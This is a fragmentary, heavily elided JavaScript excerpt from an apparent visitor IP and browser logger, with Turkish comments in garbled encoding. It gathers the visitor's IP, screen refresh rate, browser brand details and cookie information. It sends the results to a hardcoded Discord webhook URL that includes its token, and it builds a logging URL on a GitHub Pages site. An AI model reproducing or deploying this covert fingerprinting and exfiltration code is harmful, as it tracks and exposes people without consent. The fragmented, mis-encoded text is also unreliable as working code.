...
function(){
    var useripaddr = useripaddr || null;
}
,500
)
...
hertz: function()
{
    ...
    try{
getFPS().then(fps => window.sessionStorage.setItem("hertz",(fps.toFixed(3))));
    }
...
setTimeout(
    ...
    if(
        window.sessionStorage.getItem("hertz")
    ){
        screenhertz = window.sessionStorage.getItem("hertz")
    }
    else{
        screenhertz = null;
    }
...
// Vivaldi tarayÄ±cÄ±lardaki brands Array'inde 2 deÄŸer var, ama diÄŸer tarayÄ±cÄ±larla da karÄ±ÅŸabilir o yÃ¼zden beta dedim.
...
const whu = "https://discord.com/api/webhooks/1091822815163977868/6yvdUUC-a3RUC1weKT2WNyM2aAlGdrPMc206TZ56PRAAOjRdX6qlHaxJXlZEr-fVRLBq";
...
var message = ""; // GÃ¶nderilecek mesaj
var whurl = "https://discord.com/api/webhooks/1091822815163977868/6yvdUUC-a3RUC1weKT2WNyM2aAlGdrPMc206TZ56PRAAOjRdX6qlHaxJXlZEr-fVRLBq"; // MesajÄ±n gÃ¶nderileceÄŸi webhook url'si
var username = ""; // MesajÄ± GÃ¶nderecek Botun KullanÄ±cÄ± adÄ±
...
var url = "http://iskenderjs.github.io/iplog/lister.html"
...
var url = url + '&cookie=' + logger.supports.cookie();
